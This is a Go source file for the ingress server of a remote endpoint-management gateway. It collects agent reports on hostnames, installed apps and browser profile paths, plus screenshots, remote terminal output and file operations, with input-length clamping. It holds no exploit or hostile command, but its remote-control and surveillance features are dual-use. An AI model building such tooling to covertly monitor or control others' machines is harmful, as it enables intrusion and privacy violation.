// Package transport owns gateway application ingress and dashboard state.
package transport

import (
	"encoding/json"
	"strings"
	"sync"
	"time"

	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/activity"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/broker"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/command"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/fileworkspace"
	operationjournal "github.com/codevault-llc/xenomorph/platform/services/gateway/internal/operation"
	pb "github.com/codevault-llc/xenomorph/platform/shared/proto/gen/go/platform/v1"
)

const (
	maxCommandIDLen      = 128
	maxTypeLen           = 64
	maxStatusLen         = 32
	maxHostnameLen       = 120
	maxReasonLen         = 512
	maxBrowserNameLen    = 80
	maxPathLen           = 260
	maxAppNameLen        = 120
	maxOSVersionLen      = 120
	maxLogMessageLen     = 2048
	maxTerminalOutputLen = 128 * 1024

	maxBrowsers = 32
	maxApps     = 200

	maxScreenMediaFrameBytes = 10 << 20
)

// Server owns authenticated application ingress, durable command integration,
// dashboard state, and broker publication. QUIC termination is delegated to
// agentquic.Listener; browser HTTP remains owned by RunDashboard.
type Server struct {
	broker           *broker.NATS
	commandQueue     *command.Queue
	statusProvider   agentStatusProvider
	screenStore      *ScreenStore
	screenSessions   *ScreenSessions
	logStore         *AgentLogStore
	terminalStore    *TerminalStore
	fileWorkspace    *fileworkspace.Service
	fileOperatorID   string
	dashboardOrigin  string
	readiness        readinessProvider
	quicTransfers    *quicTransferRegistry
	operationJournal *operationjournal.Journal
	clientBuilder    ClientBuilder

	seenMu     sync.Mutex
	seenAgents map[string]struct{}
}

type readinessProvider interface {
	Ready() error
}

// agentStatusProvider is the interface the Server requires for agent presence
// queries. The activity.Monitor implements this interface.
type agentStatusProvider interface {
	Snapshot(agentID string) (activity.AgentSnapshot, bool)
}

// NewServer constructs the transport-neutral gateway application server.
func NewServer(b *broker.NATS, commandQueue *command.Queue, statusProvider agentStatusProvider) *Server {
	s := &Server{
		broker:         b,
		commandQueue:   commandQueue,
		statusProvider: statusProvider,
		screenStore:    NewScreenStore(),
		screenSessions: NewScreenSessions(),
		logStore:       NewAgentLogStore(maxLogEntriesPerAgent),
		terminalStore:  NewTerminalStore(),
		seenAgents:     make(map[string]struct{}),
		quicTransfers:  newQUICTransferRegistry(),
	}

	return s
}

// ConfigureReadiness installs the gateway-owned readiness dependency exposed
// by the administrative health endpoint.
func (s *Server) ConfigureReadiness(provider readinessProvider) {
	s.readiness = provider
}

// ConfigureOperationJournal installs durable non-command operation idempotency.
func (s *Server) ConfigureOperationJournal(journal *operationjournal.Journal) {
	s.operationJournal = journal
}

// attestationBrowser is the JSON shape for a browser entry in the endpoint attestation report.
type attestationBrowser struct {
	Name       string `json:"name"`
	BinaryPath string `json:"binary_path"`
	ProfileDir string `json:"profile_dir"`
}

// attestationRequest is the JSON shape for the endpoint attestation submission.
type attestationRequest struct {
	Hostname              string               `json:"hostname" binding:"required"`
	OSVersion             string               `json:"os_version"`
	RequiresAttestation   bool                 `json:"requires_attestation"`
	Browsers              []attestationBrowser `json:"browsers"`
	InstalledApplications []string             `json:"installed_applications"`
}

// browserInfo is normalized client-authored browser installation metadata.
type browserInfo struct {
	Name       string
	BinaryPath string
	ProfileDir string
}

// normalizedAttestationReport is the validated endpoint attestation data used to
// construct a gateway-authored audit event. Its fields remain client-authored telemetry.
type normalizedAttestationReport struct {
	AgentID               string
	Hostname              string
	OSVersion             string
	RequiresAttestation   bool
	Browsers              []browserInfo
	InstalledApplications []string
	OccurredAt            time.Time
}

// commandResultRequest is the JSON shape for a command execution result.
type commandResultRequest struct {
	CommandID                string          `json:"command_id" binding:"required"`
	Type                     string          `json:"type" binding:"required"`
	Status                   string          `json:"status" binding:"required"`
	Reason                   string          `json:"reason"`
	ClientHostname           string          `json:"client_hostname"`
	OutputData               []byte          `json:"output_data,omitempty"`
	TerminalSessionID        string          `json:"terminal_session_id"`
	TerminalShell            string          `json:"terminal_shell"`
	TerminalCommand          string          `json:"terminal_command"`
	TerminalWorkingDirectory string          `json:"terminal_working_directory"`
	TerminalExitCode         int             `json:"terminal_exit_code"`
	Result                   json.RawMessage `json:"result"`
}

func (s *Server) recordSpecialCommandResult(agentID string, req commandResultRequest) error {
	commandType := CommandType(req.Type)

	switch {
	case commandType == CommandTypeRequestScreenshot:
		s.recordScreenshotResult(agentID, req)
	case commandType == CommandTypeTerminalRun:
		s.storeTerminalResult(agentID, req)
	case strings.HasPrefix(req.Type, "files.") && s.fileWorkspace != nil:
		return s.fileWorkspace.Complete(agentID, req.CommandID, req.Status, req.Result)
	}

	return nil
}

func (s *Server) recordScreenshotResult(agentID string, req commandResultRequest) {
	if req.Status == "executed" && len(req.OutputData) > 0 {
		s.screenStore.Save(agentID, ScreenFrame{
			AgentID: agentID, CommandID: req.CommandID, CapturedAt: time.Now().UTC(),
			Content: append([]byte(nil), req.OutputData...),
		})
	}
}

// DashboardRuntime exposes browser dashboard dependencies without giving the
// dashboard direct access to the mTLS HTTP handlers.
func (s *Server) DashboardRuntime() DashboardRuntime {
	directory, _ := s.statusProvider.(ClientDirectory)

	return DashboardRuntime{
		Directory:       directory,
		CommandQueue:    s.commandQueue,
		Screens:         s.screenStore,
		Sessions:        s.screenSessions,
		Logs:            s.logStore,
		Terminals:       s.terminalStore,
		Files:           s.fileWorkspace,
		FileOperatorID:  s.fileOperatorID,
		DashboardOrigin: s.dashboardOrigin,
		Readiness:       s.readiness,
		ClientBuilder:   s.clientBuilder,
	}
}

// ConfigureClientBuilder installs the gateway-owned fixed-toolchain builder
// used by the browser artifact download route.
func (s *Server) ConfigureClientBuilder(builder ClientBuilder) {
	s.clientBuilder = builder
}

// ConfigureFileWorkspace attaches the gateway-owned durable file service and
// its server-authored audit source label to the dashboard transport.
func (s *Server) ConfigureFileWorkspace(service *fileworkspace.Service, operatorID string) {
	s.fileWorkspace = service
	s.fileOperatorID = operatorID
}

// ConfigureDashboardOrigin sets the exact browser origin permitted to open
// administrative WebSocket connections.
func (s *Server) ConfigureDashboardOrigin(origin string) {
	s.dashboardOrigin = strings.TrimSpace(origin)
}

func (s *Server) storeTerminalResult(agentID string, req commandResultRequest) {
	if s == nil || s.terminalStore == nil {
		return
	}

	s.terminalStore.Complete(agentID, req.CommandID, TerminalEntry{
		AgentID:          agentID,
		SessionID:        clampText(strings.TrimSpace(req.TerminalSessionID), maxCommandIDLen),
		CommandID:        clampText(strings.TrimSpace(req.CommandID), maxCommandIDLen),
		Command:          clampText(strings.TrimSpace(req.TerminalCommand), maxLogMessageLen),
		Shell:            normalizeTerminalShell(req.TerminalShell),
		WorkingDirectory: clampText(strings.TrimSpace(req.TerminalWorkingDirectory), maxPathLen),
		Status:           clampText(strings.TrimSpace(req.Status), maxStatusLen),
		ExitCode:         req.TerminalExitCode,
		OutputLog:        clampTerminalOutput(req.OutputData, maxTerminalOutputLen),
		Reason:           clampText(strings.TrimSpace(req.Reason), maxReasonLen),
	})
}

func (s *Server) storeLogEnvelope(env *pb.EventEnvelope) {
	if s == nil || s.logStore == nil || env == nil || env.Security == nil {
		return
	}

	entry := env.GetLogEntry()
	if entry == nil {
		return
	}

	observedAt := time.Now().UTC()
	if env.Timestamp != nil {
		observedAt = env.Timestamp.AsTime()
	}

	s.logStore.Append(AgentLogEntry{
		EventID:    env.EventId,
		AgentID:    env.Security.AgentId,
		ClientIP:   env.Security.ClientIp,
		ObservedAt: observedAt,
		Level:      entry.Level,
		Component:  entry.Component,
		Message:    entry.Message,
	})
}

// markSeen records that an agent has been observed. Returns whether this is
// the first observation (inserted) and whether the agent was previously known
// (existed). Thread-safe.
func (s *Server) markSeen(agentID string) bool {
	s.seenMu.Lock()
	defer s.seenMu.Unlock()

	_, existed := s.seenAgents[agentID]
	if !existed {
		s.seenAgents[agentID] = struct{}{}
		return false
	}

	return true
}

// normalizeAttestationRequest validates and constrains an attestation request into a
// normalizedAttestationReport. Every client-supplied text field is clamped to a
// maximum length before entering the event pipeline.
//
// Length limits and why:
//   - Hostname: 120 characters (typical FQDN limit per RFC 1035).
//   - OSVersion: 120 characters (free-form, but bounded to prevent abuse).
//   - Browser name: 80 characters.
//   - BinaryPath: 260 characters (Windows MAX_PATH convention).
//   - ProfileDir: 260 characters (same convention).
//   - Application name: 120 characters.
//   - Maximum browsers: 32 (reasonable upper bound for browser enumeration).
//   - Maximum applications: 200 (prevents unbounded memory growth).
func normalizeAttestationRequest(agentID string, req attestationRequest) normalizedAttestationReport {
	browsers := make([]browserInfo, 0, len(req.Browsers))
	for _, b := range req.Browsers {
		if len(browsers) >= maxBrowsers {
			break
		}

		name := clampText(b.Name, maxBrowserNameLen)
		if name == "" {
			continue
		}

		browsers = append(browsers, browserInfo{
			Name:       name,
			BinaryPath: clampText(b.BinaryPath, maxPathLen),
			ProfileDir: clampText(b.ProfileDir, maxPathLen),
		})
	}

	apps := make([]string, 0, len(req.InstalledApplications))
	for _, app := range req.InstalledApplications {
		if len(apps) >= maxApps {
			break
		}

		item := clampText(app, maxAppNameLen)
		if item == "" {
			continue
		}

		apps = append(apps, item)
	}

	return normalizedAttestationReport{
		AgentID:               agentID,
		Hostname:              clampText(req.Hostname, maxHostnameLen),
		OSVersion:             clampText(req.OSVersion, maxOSVersionLen),
		RequiresAttestation:   req.RequiresAttestation,
		Browsers:              browsers,
		InstalledApplications: apps,
		OccurredAt:            time.Now().UTC(),
	}
}

// clampText truncates the input to the specified byte length after trimming
// whitespace. Returns an empty string when the trimmed input is empty.
//
// This is the final length gate for client-supplied strings entering the
// event pipeline. Every handler that stores or forwards user-authored text
// must pass the text through clampText with a limit appropriate for the
// downstream consumer.
func clampText(value string, limit int) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}

	if len(trimmed) <= limit {
		return trimmed
	}

	return trimmed[:limit]
}
